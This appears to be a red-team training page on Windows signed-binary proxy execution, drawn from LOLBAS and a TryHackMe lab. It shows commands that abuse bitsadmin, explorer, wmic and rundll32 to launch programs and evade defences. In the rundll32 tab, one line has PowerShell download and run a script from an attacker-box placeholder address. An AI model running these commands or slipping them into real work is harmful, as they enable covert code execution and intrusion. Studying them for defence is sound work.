# File Operations

## Theory

Here, we will show various ways of executing a binary within the operating system. The typical case of executing a binary involves various known methods such as using the command line cmd.exe or from the desktop. However, other ways exist to achieve payload execution by abusing other system binaries, of which one of the reasons is to hide or harden the payload's process. . This techniques are covered by the [LOLBAS project](https://lolbas-project.github.io)
Based on the MITRE ATT&CK framework, this technique is called **Signed Binary Proxy Execution** or **Indirect Command Execution**.

## Practice

{% tabs %}
{% tab title="BITSAdmin.exe" %}
The bitsadmin tool is a system administrator utility that can be used to create, download or upload Background Intelligent Transfer Service (BITS) jobs and check their progress. [BITS](https://learn.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) is a low-bandwidth and asynchronous method to download and upload files from HTTP webservers and SMB servers. Additional information about the bitsadmin tool can be found at [Microsoft Docs](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin).

```bash
#Execute a file
#One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job. 
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset
```
{% endtab %}
{% tab title="explorer.exe" %}
File Explorer is a file manager and system component for Windows. People found that using the file explorer binary can execute other .exe files. This technique is called Indirect Command Execution, where the explorer.exe tool can be used and abused to launch malicious scripts or executables from a trusted parent process.

```bash
#Create a child process of explorer.exe
explorer.exe /root,"C:\Windows\System32\calc.exe"
```
{% endtab %}
{% tab title="wmic.exe" %}
Windows Management Instrumentation (WMIC) is a Windows command-line utility that manages Windows components. People found that WMIC is also used to execute binaries for evading defensive measures. 

```bash
#Execute calc.exe
wmic.exe process call create calc
```
The MITRE ATT&CK framework refers to this technique as [Signed Binary Proxy Execution (T1218)](https://attack.mitre.org/techniques/T1218/)
{% endtab %}


{% tab title="rundll32.exe" %}
Rundll32 is a Microsoft built-in tool that loads and runs Dynamic Link Library DLL files within the operating system. A red team can abuse and leverage rundll32.exe to run arbitrary payloads and execute JavaScript and PowerShell scripts. 

```bash
#Execute Binary - calc.exe
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");

#Execute powershell scripts
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
```
The MITRE ATT&CK framework refers to this technique as [Signed Binary Proxy Execution (T1218)](https://attack.mitre.org/techniques/T1218/)
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Note that other tools can be used for file executions. We suggest visiting the [LOLBAS](https://lolbas-project.github.io/)[ ](https://lolbas-project.github.io/)project to check them out.
{% endhint %}

{% hint style="danger" %}
Note that other Leav off the Land techniques can be found in the [Weaponization section](../../weapon/README.md).
{% endhint %}


## References

{% embed url="https://tryhackme.com/room/livingofftheland" %}
{% embed url="https://lolbas-project.github.io/#" %}